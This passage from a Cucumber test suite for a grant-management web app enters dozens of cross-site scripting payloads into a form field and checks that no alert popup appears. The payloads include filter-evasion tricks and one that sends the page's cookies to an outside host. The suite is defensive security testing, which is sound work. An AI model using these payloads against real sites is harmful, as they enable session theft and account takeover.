      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                    | Field                  |
      | <script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302210 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                  | Field                  |
      | <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302213 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                     | Field                  |
      | <script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302221 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                 | Field                  |
      | <script>location='javascript:alert\x281\x29'</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302222 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                          | Field                  |
      | <script>location=name</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302224 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                     | Field                  |
      | <script>alert`1`</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302225 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                               | Field                  |
      | <script>new Function`X${document.location.hash.substr`1`}`</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302226 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                             | Field                  |
      | <script>Function`X${document.location.hash.substr`1`}```</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302227 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                  |
      | <video><source onerror=location=/\02.rs/+document.cookie> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302228 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                | Field                  |
      | <svg onload=alert(1) | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302229 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                    | Field                  |
      | <svg onload=alert(1)<!-- | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302231 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                     | Field                  |
      | <script>throw[onerror]=[alert],1</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302234 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                             | Field                  |
      | <script>var{a:onerror}={a:alert};throw 1</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302236 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                              | Field                  |
      | <script>var{haha:onerror=alert}=0;throw 1</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302237 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                         | Field                  |
      | <script>window.name='javascript:alert(1)';</script><svg onload=location=name> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302239 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                       | Field                  |
      | <xss class=progress-bar-animated onanimationstart=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302240 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                                                   | Field                  |
      | <xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302245 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                              | Field                  |
      | <iframe src="javascript:alert(1)"> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302248 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                               | Field                  |
      | <object data="javascript:alert(1)"> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302256 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                             | Field                  |
      | <embed src="javascript:alert(1)"> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302257 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                 | Field                  |
      | <a href="javascript:alert(1)">XSS</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302258 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
